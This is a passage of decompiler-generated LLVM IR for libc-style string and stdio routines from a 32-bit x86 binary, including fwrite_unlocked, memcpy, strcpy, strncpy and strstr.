  %v1_804f0f1 = icmp eq i32 %v7_804f0e9, 0
  br i1 %v1_804f0f1, label %dec_label_pc_804f0fc, label %dec_label_pc_804f0f5

dec_label_pc_804f0f5:                             ; preds = %dec_label_pc_804f0da, %dec_label_pc_804f0c5, %dec_label_pc_804f0c0, %dec_label_pc_804f0af
  %v0_804f0f5 = load i32, i32* @esi, align 4
  store i32 %v0_804f0f5, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f0f7

dec_label_pc_804f0f7:                             ; preds = %dec_label_pc_804f055, %dec_label_pc_804f0f5
  %v0_804f0f7 = phi i32 [ %v0_804f0f7.pre, %dec_label_pc_804f055 ], [ %v0_804f0f5, %dec_label_pc_804f0f5 ]
  %v1_804f0f7 = urem i32 %v0_804f0f7, 256
  store i32 %v1_804f0f7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f0ff

dec_label_pc_804f0fc:                             ; preds = %dec_label_pc_804f0da, %dec_label_pc_804f09f, %dec_label_pc_804f071, %dec_label_pc_804f0d5
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f0ff

dec_label_pc_804f0ff:                             ; preds = %dec_label_pc_804f0f7, %dec_label_pc_804f08b, %dec_label_pc_804f0fc
  %v0_804f104 = phi i32 [ %v1_804f0f7, %dec_label_pc_804f0f7 ], [ %v1_804f08d, %dec_label_pc_804f08b ], [ -1, %dec_label_pc_804f0fc ]
  store i32 %v0_804f041, i32* @ebx, align 4
  ret i32 %v0_804f104

; uselistorder directives
  uselistorder i32 %v1_804f0f7, { 1, 0 }
  uselistorder i32 %v1_804f08d, { 1, 0 }
  uselistorder i32 %v0_804f0e8, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v0_804f071, { 1, 0 }
  uselistorder label %dec_label_pc_804f0ff, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f0fc, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_804f0f7, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f108 = load i32, i32* @esi, align 4
  %v0_804f109 = load i32, i32* @ebx, align 4
  store i32 %v0_804f109, i32* %stack_var_-8, align 4
  %v4_804f10d = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f10d, i32* @ebx, align 4
  %v3_804f112 = call i32 @strlen(i8* %arg1)
  store i32 %v3_804f112, i32* @esi, align 4
  %v0_804f123 = load i32, i32* @ebx, align 4
  %v6_804f124 = call i32 @__GI_fwrite_unlocked(i32 %v0_804f123, i64 1, i32 %v3_804f112, i32 %arg2)
  %v1_804f12f = load i32, i32* @esi, align 4
  %v12_804f12f = icmp eq i32 %v6_804f124, %v1_804f12f
  %v1_804f131 = icmp eq i1 %v12_804f12f, false
  br i1 %v1_804f131, label %dec_label_pc_804f135, label %dec_label_pc_804f133

dec_label_pc_804f133:                             ; preds = %entry
  br label %dec_label_pc_804f135

dec_label_pc_804f135:                             ; preds = %entry, %dec_label_pc_804f133
  %v0_804f135 = phi i32 [ -1, %entry ], [ %v6_804f124, %dec_label_pc_804f133 ]
  %v2_804f137 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f137, i32* @edx, align 4
  %v2_804f138 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f138, i32* @ebx, align 4
  store i32 %v0_804f108, i32* @esi, align 4
  ret i32 %v0_804f135

; uselistorder directives
  uselistorder i32 %v6_804f124, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f135, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_804f13c = load i32, i32* @edi, align 4
  %v0_804f13d = load i32, i32* @esi, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v4_804f143 = trunc i64 %arg2 to i32
  store i32 %v4_804f143, i32* @esi, align 4
  store i32 %arg3, i32* @edi, align 4
  %v1_804f14b = inttoptr i32 %arg4 to i16*
  %v2_804f14b = load i16, i16* %v1_804f14b, align 2
  %v1_804f14e = and i16 %v2_804f14b, 192
  %v6_804f153 = icmp eq i16 %v1_804f14e, 192
  br i1 %v6_804f153, label %dec_label_pc_804f16e, label %dec_label_pc_804f15a

dec_label_pc_804f15a:                             ; preds = %entry
  %v0_804f15a = load i32, i32* @edx, align 4
  store i32 %arg4, i32* %stack_var_-28, align 4
  %v6_804f162 = call i32 @__stdio_trans2w_o(i16* %v1_804f14b, i32 128, i32 %v0_804f15a, i32 %v0_804f15a)
  %v1_804f16a = icmp eq i32 %v6_804f162, 0
  %v1_804f16c = icmp eq i1 %v1_804f16a, false
  br i1 %v1_804f16c, label %dec_label_pc_804f1aa, label %dec_label_pc_804f16e

dec_label_pc_804f16e:                             ; preds = %dec_label_pc_804f15a, %entry
  %v2_804f16e = icmp eq i32 %v4_804f143, 0
  br i1 %v2_804f16e, label %dec_label_pc_804f1aa, label %dec_label_pc_804f172

dec_label_pc_804f172:                             ; preds = %dec_label_pc_804f16e
  %v1_804f172 = icmp eq i32 %arg3, 0
  br i1 %v1_804f172, label %dec_label_pc_804f1aa, label %dec_label_pc_804f176

dec_label_pc_804f176:                             ; preds = %dec_label_pc_804f172
  %v9_804f17b = udiv i64 4294967295, %arg2
  %v10_804f17b = trunc i64 %v9_804f17b to i32
  %v6_804f17f = icmp ult i32 %v10_804f17b, %arg3
  br i1 %v6_804f17f, label %dec_label_pc_804f19b, label %dec_label_pc_804f181

dec_label_pc_804f181:                             ; preds = %dec_label_pc_804f176
  %sext = mul i64 %arg2, 4294967296
  %v2_804f184 = sdiv i64 %sext, 4294967296
  %v3_804f184 = sext i32 %arg3 to i64
  %v4_804f184 = mul nsw i64 %v3_804f184, %v2_804f184
  %v5_804f184 = trunc i64 %v4_804f184 to i32
  %v0_804f187 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-28, align 4
  %v5_804f18d = call i32 @__stdio_fwrite(i32 %arg1, i32 %v5_804f184, i32 %v0_804f187, i32 %v10_804f17b)
  %v6_804f18d = sext i32 %v5_804f18d to i64
  %v10_804f194 = udiv i64 %v6_804f18d, %arg2
  %v11_804f194 = trunc i64 %v10_804f194 to i32
  br label %dec_label_pc_804f1ac

dec_label_pc_804f19b:                             ; preds = %dec_label_pc_804f176
  %v0_804f19b = load i32, i32* @ebx, align 4
  %v1_804f19b = inttoptr i32 %v0_804f19b to i16*
  %v2_804f19b = load i16, i16* %v1_804f19b, align 2
  %v3_804f19b = or i16 %v2_804f19b, 8
  store i16 %v3_804f19b, i16* %v1_804f19b, align 2
  %v0_804f19f = load i32, i32* %stack_var_-28, align 4
  %v1_804f19f = call i32 @__errno_location(i32 %v0_804f19f)
  %v1_804f1a4 = inttoptr i32 %v1_804f19f to i32*
  store i32 22, i32* %v1_804f1a4, align 4
  br label %dec_label_pc_804f1aa

dec_label_pc_804f1aa:                             ; preds = %dec_label_pc_804f172, %dec_label_pc_804f16e, %dec_label_pc_804f15a, %dec_label_pc_804f19b
  br label %dec_label_pc_804f1ac

dec_label_pc_804f1ac:                             ; preds = %dec_label_pc_804f181, %dec_label_pc_804f1aa
  %v0_804f1af = phi i32 [ %v11_804f194, %dec_label_pc_804f181 ], [ 0, %dec_label_pc_804f1aa ]
  store i32 %v0_804f13d, i32* @esi, align 4
  store i32 %v0_804f13c, i32* @edi, align 4
  ret i32 %v0_804f1af

; uselistorder directives
  uselistorder i32 %v0_804f15a, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__stdio_fwrite, { 5, 4, 3, 1, 0, 6, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i64 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f1ac, { 1, 0 }
  uselistorder label %dec_label_pc_804f1aa, { 3, 0, 1, 2 }
}

define i32 @memcpy(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f1b1 = load i32, i32* @esi, align 4
  store i32 %v0_804f1b1, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_804f1b2 = sdiv i32 %sext, 16777216
  store i32 %v4_804f1b2, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f1bc = ptrtoint i16* %arg1 to i32
  store i32 %v4_804f1bc, i32* %edi.global-to-local, align 4
  %v2_804f1c0 = udiv i32 %v4_804f1b2, 4
  %v3_804f1c3 = inttoptr i32 %arg2 to i8*
  %v4_804f1c3 = bitcast i16* %arg1 to i8*
  %v5_804f1c3 = call i8* @_memcpy(i8* %v4_804f1c3, i8* %v3_804f1c3, i32 %v2_804f1c0)
  %v6_804f1c3 = ptrtoint i8* %v5_804f1c3 to i32
  store i32 %v6_804f1c3, i32* @ecx, align 4
  %v0_804f1c5 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f1c5 = and i32 %v0_804f1c5, 2
  %v3_804f1c5 = icmp eq i32 %v2_804f1c5, 0
  br i1 %v3_804f1c5, label %dec_label_pc_804f1cb, label %dec_label_pc_804f1c9

dec_label_pc_804f1c9:                             ; preds = %entry
  %v0_804f1c9 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f1c9 = inttoptr i32 %v0_804f1c9 to i16*
  %v2_804f1c9 = load i16, i16* %v1_804f1c9, align 2
  %v3_804f1c9 = load i32, i32* %edi.global-to-local, align 4
  %v4_804f1c9 = inttoptr i32 %v3_804f1c9 to i16*
  store i16 %v2_804f1c9, i16* %v4_804f1c9, align 2
  %v5_804f1c9 = load i32, i32* %edi.global-to-local, align 4
  %v6_804f1c9 = load i32, i32* %esi.global-to-local, align 4
  %v9_804f1c9 = add i32 %v5_804f1c9, 2
  %v10_804f1c9 = add i32 %v6_804f1c9, 2
  store i32 %v9_804f1c9, i32* %edi.global-to-local, align 4
  store i32 %v10_804f1c9, i32* %esi.global-to-local, align 4
  %v0_804f1cb.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f1cb

dec_label_pc_804f1cb:                             ; preds = %entry, %dec_label_pc_804f1c9
  %v0_804f1cb = phi i32 [ %v0_804f1c5, %entry ], [ %v0_804f1cb.pre, %dec_label_pc_804f1c9 ]
  %v2_804f1cb = urem i32 %v0_804f1cb, 2
  %v3_804f1cb = icmp eq i32 %v2_804f1cb, 0
  br i1 %v3_804f1cb, label %dec_label_pc_804f1d0, label %dec_label_pc_804f1cf

dec_label_pc_804f1cf:                             ; preds = %dec_label_pc_804f1cb
  %v0_804f1cf = load i32, i32* %esi.global-to-local, align 4
  %v1_804f1cf = inttoptr i32 %v0_804f1cf to i8*
  %v2_804f1cf = load i8, i8* %v1_804f1cf, align 1
  %v3_804f1cf = load i32, i32* %edi.global-to-local, align 4
  %v4_804f1cf = inttoptr i32 %v3_804f1cf to i8*
  store i8 %v2_804f1cf, i8* %v4_804f1cf, align 1
  %v5_804f1cf = load i32, i32* %edi.global-to-local, align 4
  %v6_804f1cf = load i32, i32* %esi.global-to-local, align 4
  %v9_804f1cf = add i32 %v5_804f1cf, 1
  %v10_804f1cf = add i32 %v6_804f1cf, 1
  store i32 %v9_804f1cf, i32* %edi.global-to-local, align 4
  store i32 %v10_804f1cf, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f1d0

dec_label_pc_804f1d0:                             ; preds = %dec_label_pc_804f1cb, %dec_label_pc_804f1cf
  store i32 %v4_804f1bc, i32* %eax.global-to-local, align 4
  %v2_804f1d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f1d4, i32* @esi, align 4
  ret i32 %v4_804f1bc

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_804f1d0, { 1, 0 }
  uselistorder label %dec_label_pc_804f1cb, { 1, 0 }
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_804f1d8 = load i32, i32* @edi, align 4
  %v4_804f1e1 = ptrtoint i8* %arg1 to i32
  %v5_804f1e5 = call i8* @_memset(i8* %arg1, i32 %arg2, i32 %arg3)
  %v6_804f1e5 = ptrtoint i8* %v5_804f1e5 to i32
  store i32 %v6_804f1e5, i32* @ecx, align 4
  store i32 %v0_804f1d8, i32* @edi, align 4
  ret i32 %v4_804f1e1

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_strchr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804f1f1 = ptrtoint i8* %arg1 to i32
  %v2_804f1f9 = mul i32 %arg2, 256
  %v3_804f1f9 = and i32 %v2_804f1f9, 65280
  %v4_804f1f9 = and i32 %arg2, -65281
  %v5_804f1f9 = or i32 %v3_804f1f9, %v4_804f1f9
  br label %dec_label_pc_804f1fb

dec_label_pc_804f1fb:                             ; preds = %dec_label_pc_804f200, %entry
  %v4_804f1fb = phi i32 [ %v6_804f1fb, %dec_label_pc_804f200 ], [ %v5_804f1f9, %entry ]
  %v7_804f1fb = phi i32 [ %v10_804f1fb, %dec_label_pc_804f200 ], [ %v4_804f1f1, %entry ]
  %v1_804f1fb = inttoptr i32 %v7_804f1fb to i8*
  %v2_804f1fb = load i8, i8* %v1_804f1fb, align 1
  %v3_804f1fc = udiv i32 %v4_804f1fb, 256
  %v4_804f1fc = trunc i32 %v3_804f1fc to i8
  %v16_804f1fc = icmp eq i8 %v2_804f1fb, %v4_804f1fc
  br i1 %v16_804f1fc, label %dec_label_pc_804f209, label %dec_label_pc_804f200

dec_label_pc_804f200:                             ; preds = %dec_label_pc_804f1fb
  %v10_804f1fb = add i32 %v7_804f1fb, 1
  %v3_804f1fb = zext i8 %v2_804f1fb to i32
  %v5_804f1fb = and i32 %v4_804f1fb, -256
  %v6_804f1fb = or i32 %v3_804f1fb, %v5_804f1fb
  %v4_804f200 = icmp eq i8 %v2_804f1fb, 0
  %v1_804f202 = icmp eq i1 %v4_804f200, false
  br i1 %v1_804f202, label %dec_label_pc_804f1fb, label %dec_label_pc_804f204

dec_label_pc_804f204:                             ; preds = %dec_label_pc_804f200
  br label %dec_label_pc_804f209

dec_label_pc_804f209:                             ; preds = %dec_label_pc_804f1fb, %dec_label_pc_804f204
  %v0_804f209 = phi i32 [ 0, %dec_label_pc_804f204 ], [ %v7_804f1fb, %dec_label_pc_804f1fb ]
  ret i32 %v0_804f209

; uselistorder directives
  uselistorder i8 %v2_804f1fb, { 1, 2, 0 }
  uselistorder i32 %v4_804f1fb, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804f209, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f211 = load i32, i32* @esi, align 4
  store i32 %v0_804f211, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f219 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f219, i32* %edi.global-to-local, align 4
  %v4_804f21d.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804f21d

dec_label_pc_804f21d:                             ; preds = %dec_label_pc_804f21d.dec_label_pc_804f21d_crit_edge, %entry
  %v2_804f21e = phi i32 [ %v7_804f21e, %dec_label_pc_804f21d.dec_label_pc_804f21d_crit_edge ], [ %v4_804f219, %entry ]
  %v4_804f21d = phi i32 [ %v0_804f21f, %dec_label_pc_804f21d.dec_label_pc_804f21d_crit_edge ], [ %v4_804f21d.pre, %entry ]
  %v7_804f21d = phi i32 [ %v0_804f21d.pre, %dec_label_pc_804f21d.dec_label_pc_804f21d_crit_edge ], [ %arg2, %entry ]
  %v1_804f21d = inttoptr i32 %v7_804f21d to i8*
  %v2_804f21d = load i8, i8* %v1_804f21d, align 1
  %v3_804f21d = zext i8 %v2_804f21d to i32
  %v5_804f21d = and i32 %v4_804f21d, -256
  %v6_804f21d = or i32 %v3_804f21d, %v5_804f21d
  store i32 %v6_804f21d, i32* %eax.global-to-local, align 4
  %v10_804f21d = add i32 %v7_804f21d, 1
  store i32 %v10_804f21d, i32* %esi.global-to-local, align 4
  %v3_804f21e = inttoptr i32 %v2_804f21e to i8*
  store i8 %v2_804f21d, i8* %v3_804f21e, align 1
  %v4_804f21e = load i32, i32* %edi.global-to-local, align 4
  %v7_804f21e = add i32 %v4_804f21e, 1
  store i32 %v7_804f21e, i32* %edi.global-to-local, align 4
  %v0_804f21f = load i32, i32* %eax.global-to-local, align 4
  %v3_804f21f = trunc i32 %v0_804f21f to i8
  %v4_804f21f = icmp eq i8 %v3_804f21f, 0
  %v1_804f221 = icmp eq i1 %v4_804f21f, false
  br i1 %v1_804f221, label %dec_label_pc_804f21d.dec_label_pc_804f21d_crit_edge, label %dec_label_pc_804f223

dec_label_pc_804f21d.dec_label_pc_804f21d_crit_edge: ; preds = %dec_label_pc_804f21d
  %v0_804f21d.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f21d

dec_label_pc_804f223:                             ; preds = %dec_label_pc_804f21d
  store i32 %v4_804f219, i32* %eax.global-to-local, align 4
  %v2_804f227 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f227, i32* @edx, align 4
  %v2_804f228 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f228, i32* @esi, align 4
  ret i32 %v4_804f219

; uselistorder directives
  uselistorder i32 %v0_804f21f, { 1, 0 }
  uselistorder i32 %v7_804f21e, { 1, 0 }
  uselistorder i32 %v4_804f219, { 1, 2, 0, 3 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @strncpy(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804f241 = load i32, i32* @esi, align 4
  store i32 %v0_804f241, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_804f24d = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f24d, i32* %edi.global-to-local, align 4
  %v1_804f251 = add i32 %arg3, 1
  store i32 %v1_804f251, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f252

dec_label_pc_804f252:                             ; preds = %dec_label_pc_804f255, %entry
  %v3_804f256 = phi i32 [ %v4_804f24d, %entry ], [ %v8_804f256, %dec_label_pc_804f255 ]
  %v0_804f252 = phi i32 [ %v1_804f251, %entry ], [ %v0_804f252.pre, %dec_label_pc_804f255 ]
  %v1_804f252 = add i32 %v0_804f252, -1
  %v8_804f252 = icmp eq i32 %v1_804f252, 0
  store i32 %v1_804f252, i32* %ecx.global-to-local, align 4
  br i1 %v8_804f252, label %.loopexit, label %dec_label_pc_804f255

dec_label_pc_804f255:                             ; preds = %dec_label_pc_804f252
  %v0_804f255 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f255 = inttoptr i32 %v0_804f255 to i8*
  %v2_804f255 = load i8, i8* %v1_804f255, align 1
  %v12_804f255 = add i32 %v0_804f255, 1
  store i32 %v12_804f255, i32* %esi.global-to-local, align 4
  %v4_804f256 = inttoptr i32 %v3_804f256 to i8*
  store i8 %v2_804f255, i8* %v4_804f256, align 1
  %v5_804f256 = load i32, i32* %edi.global-to-local, align 4
  %v8_804f256 = add i32 %v5_804f256, 1
  store i32 %v8_804f256, i32* %edi.global-to-local, align 4
  %v6_804f257 = icmp eq i8 %v2_804f255, 0
  %v1_804f259 = icmp eq i1 %v6_804f257, false
  %v0_804f252.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_804f259, label %dec_label_pc_804f252, label %dec_label_pc_804f25b

dec_label_pc_804f25b:                             ; preds = %dec_label_pc_804f255
  %v1_804f25b = add i32 %v0_804f252.pre, -1
  store i32 %v1_804f25b, i32* %ecx.global-to-local, align 4
  %v2_804f25c = sext i8 %v2_804f255 to i32
  %v4_804f25c = inttoptr i32 %v8_804f256 to i8*
  %v5_804f25c = call i8* @_memset(i8* %v4_804f25c, i32 %v2_804f25c, i32 %v1_804f25b)
  %v6_804f25c = ptrtoint i8* %v5_804f25c to i32
  store i32 %v6_804f25c, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804f252, %dec_label_pc_804f25b
  %v2_804f263 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f263, i32* %esi.global-to-local, align 4
  ret i32 %v4_804f24d

; uselistorder directives
  uselistorder i32 %v8_804f256, { 0, 2, 1 }
  uselistorder i8 %v2_804f255, { 0, 2, 1 }
  uselistorder i32 %v1_804f252, { 1, 0 }
  uselistorder i32 %v4_804f24d, { 1, 0, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @strnlen() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_1()
  %v4_804f268 = ptrtoint i8* %tmp4 to i32
  %v8_804f27b5 = icmp eq i32 %tmp, 0
  %v1_804f27c6 = icmp eq i1 %v8_804f27b5, false
  br i1 %v1_804f27c6, label %dec_label_pc_804f275, label %dec_label_pc_804f27e

dec_label_pc_804f275:                             ; preds = %entry, %dec_label_pc_804f27a
  %v1_804f27b8 = phi i32 [ %v1_804f27b, %dec_label_pc_804f27a ], [ %tmp, %entry ]
  %v0_804f27e7 = phi i32 [ %v1_804f27a, %dec_label_pc_804f27a ], [ %v4_804f268, %entry ]
  %v1_804f275 = inttoptr i32 %v0_804f27e7 to i8*
  %v2_804f275 = load i8, i8* %v1_804f275, align 1
  %v3_804f275 = icmp eq i8 %v2_804f275, 0
  br i1 %v3_804f275, label %dec_label_pc_804f27e, label %dec_label_pc_804f27a

dec_label_pc_804f27a:                             ; preds = %dec_label_pc_804f275
  %v1_804f27a = add i32 %v0_804f27e7, 1
  %v1_804f27b = add i32 %v1_804f27b8, -1
  %v8_804f27b = icmp eq i32 %v1_804f27b, 0
  %v1_804f27c = icmp eq i1 %v8_804f27b, false
  br i1 %v1_804f27c, label %dec_label_pc_804f275, label %dec_label_pc_804f27e

dec_label_pc_804f27e:                             ; preds = %dec_label_pc_804f27a, %dec_label_pc_804f275, %entry
  %v0_804f27e.lcssa = phi i32 [ %v4_804f268, %entry ], [ %v0_804f27e7, %dec_label_pc_804f275 ], [ %v1_804f27a, %dec_label_pc_804f27a ]
  %v2_804f27e = sub i32 %v0_804f27e.lcssa, %v4_804f268
  ret i32 %v2_804f27e

; uselistorder directives
  uselistorder i32 %v1_804f27b, { 1, 0 }
  uselistorder i32 %v0_804f27e7, { 0, 2, 1 }
  uselistorder i32 %v4_804f268, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f275, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %v0_804f287 = load i32, i32* @ebx, align 4
  %v4_804f28b = ptrtoint i8* %arg2 to i32
  %v2_804f293 = load i8, i8* %arg2, align 1
  %v1_804f296 = icmp eq i8 %v2_804f293, 0
  br i1 %v1_804f296, label %dec_label_pc_804f343, label %dec_label_pc_804f29e

dec_label_pc_804f29e:                             ; preds = %entry
  %v1_804f29e = add i32 %arg1, -1
  br label %dec_label_pc_804f29f

dec_label_pc_804f29f:                             ; preds = %dec_label_pc_804f2ab, %dec_label_pc_804f29e
  %v0_804f29f = phi i32 [ %v1_804f29f, %dec_label_pc_804f2ab ], [ %v1_804f29e, %dec_label_pc_804f29e ]
  %v1_804f29f = add i32 %v0_804f29f, 1
  %v1_804f2a0 = inttoptr i32 %v1_804f29f to i8*
  %v2_804f2a0 = load i8, i8* %v1_804f2a0, align 1
  %v1_804f2a3 = icmp eq i8 %v2_804f2a0, 0
  br i1 %v1_804f2a3, label %dec_label_pc_804f341, label %dec_label_pc_804f2ab

dec_label_pc_804f2ab:                             ; preds = %dec_label_pc_804f29f
  %v12_804f2ab = icmp eq i8 %v2_804f2a0, %v2_804f293
  %v1_804f2ad = icmp eq i1 %v12_804f2ab, false
  br i1 %v1_804f2ad, label %dec_label_pc_804f29f, label %dec_label_pc_804f2af

dec_label_pc_804f2af:                             ; preds = %dec_label_pc_804f2ab
  %v1_804f2af = add i32 %v4_804f28b, 1
  %v2_804f2b6 = inttoptr i32 %v1_804f2af to i8*
  %v3_804f2b6 = load i8, i8* %v2_804f2b6, align 1
  %v1_804f2bd = icmp eq i8 %v3_804f2b6, 0
  br i1 %v1_804f2bd, label %dec_label_pc_804f343, label %dec_label_pc_804f2c1

dec_label_pc_804f2c1:                             ; preds = %dec_label_pc_804f2af
  %v1_804f2c1 = add i32 %v0_804f29f, 2
  %v1_804f302 = add i32 %v4_804f28b, 2
  %v2_804f302 = inttoptr i32 %v1_804f302 to i8*
  br label %dec_label_pc_804f2f4

dec_label_pc_804f2cc:                             ; preds = %dec_label_pc_804f339
  %v2_804f2cc = inttoptr i32 %v0_804f307 to i8*
  %v3_804f2cc = load i8, i8* %v2_804f2cc, align 1
  br label %dec_label_pc_804f2e9.preheader

dec_label_pc_804f2e9.preheader:                   ; preds = %dec_label_pc_804f2cc, %dec_label_pc_804f2f4
  %v0_804f2d5.ph.in = phi i8 [ %v0_804f2e927.in, %dec_label_pc_804f2f4 ], [ %v3_804f2cc, %dec_label_pc_804f2cc ]
  %v12_804f2e954 = icmp eq i8 %v0_804f2d5.ph.in, %v2_804f293
  %v1_804f2eb55 = icmp eq i1 %v12_804f2e954, false
  br i1 %v1_804f2eb55, label %dec_label_pc_804f2d5, label %dec_label_pc_804f2ed

dec_label_pc_804f2d5:                             ; preds = %dec_label_pc_804f2e9.preheader, %dec_label_pc_804f2e5
  %v0_804f2d557.in = phi i8 [ %v2_804f2e6, %dec_label_pc_804f2e5 ], [ %v0_804f2d5.ph.in, %dec_label_pc_804f2e9.preheader ]
  %v0_804f2d956 = phi i32 [ %v1_804f2e5, %dec_label_pc_804f2e5 ], [ %v0_804f307, %dec_label_pc_804f2e9.preheader ]
  %v1_804f2d5 = icmp eq i8 %v0_804f2d557.in, 0
  br i1 %v1_804f2d5, label %dec_label_pc_804f341, label %dec_label_pc_804f2d9

dec_label_pc_804f2d9:                             ; preds = %dec_label_pc_804f2d5
  %v1_804f2d9 = add i32 %v0_804f2d956, 1
  %v1_804f2da = inttoptr i32 %v1_804f2d9 to i8*
  %v2_804f2da = load i8, i8* %v1_804f2da, align 1
  %v12_804f2dd = icmp eq i8 %v2_804f2da, %v2_804f293
  br i1 %v12_804f2dd, label %dec_label_pc_804f2ed, label %dec_label_pc_804f2e1

dec_label_pc_804f2e1:                             ; preds = %dec_label_pc_804f2d9
  %v1_804f2e1 = icmp eq i8 %v2_804f2da, 0
  br i1 %v1_804f2e1, label %dec_label_pc_804f341, label %dec_label_pc_804f2e5

dec_label_pc_804f2e5:                             ; preds = %dec_label_pc_804f2e1
  %v1_804f2e5 = add i32 %v0_804f2d956, 2
  %v1_804f2e6 = inttoptr i32 %v1_804f2e5 to i8*
  %v2_804f2e6 = load i8, i8* %v1_804f2e6, align 1
  %v12_804f2e9 = icmp eq i8 %v2_804f2e6, %v2_804f293
  %v1_804f2eb = icmp eq i1 %v12_804f2e9, false
  br i1 %v1_804f2eb, label %dec_label_pc_804f2d5, label %dec_label_pc_804f2ed

dec_label_pc_804f2ed:                             ; preds = %dec_label_pc_804f2e5, %dec_label_pc_804f2d9, %dec_label_pc_804f2e9.preheader
  %v0_804f2ed = phi i32 [ %v0_804f307, %dec_label_pc_804f2e9.preheader ], [ %v1_804f2d9, %dec_label_pc_804f2d9 ], [ %v1_804f2e5, %dec_label_pc_804f2e5 ]
  %v1_804f2ed = add i32 %v0_804f2ed, 1
  br label %dec_label_pc_804f2f4

dec_label_pc_804f2f4:                             ; preds = %dec_label_pc_804f2c1, %dec_label_pc_804f2ed
  %v0_804f2e927.in.in.in = phi i32 [ %v1_804f2ed, %dec_label_pc_804f2ed ], [ %v1_804f2c1, %dec_label_pc_804f2c1 ]
  %v0_804f307 = phi i32 [ %v1_804f2ed, %dec_label_pc_804f2ed ], [ %v1_804f2c1, %dec_label_pc_804f2c1 ]
  %v0_804f2e927.in.in = inttoptr i32 %v0_804f2e927.in.in.in to i8*
  %v0_804f2e927.in = load i8, i8* %v0_804f2e927.in.in, align 1
  %storemerge4 = icmp eq i8 %v0_804f2e927.in, %v3_804f2b6
  %v1_804f2f4 = icmp eq i1 %storemerge4, false
  br i1 %v1_804f2f4, label %dec_label_pc_804f2e9.preheader, label %dec_label_pc_804f2f6

dec_label_pc_804f2f6:                             ; preds = %dec_label_pc_804f2f4
  %v1_804f2fe = add i32 %v0_804f307, 1
  %v2_804f2fe = inttoptr i32 %v1_804f2fe to i8*
  %v3_804f2fe = load i8, i8* %v2_804f2fe, align 1
  %v3_804f302 = load i8, i8* %v2_804f302, align 1
  %v1_804f30a = add i32 %v0_804f307, -1
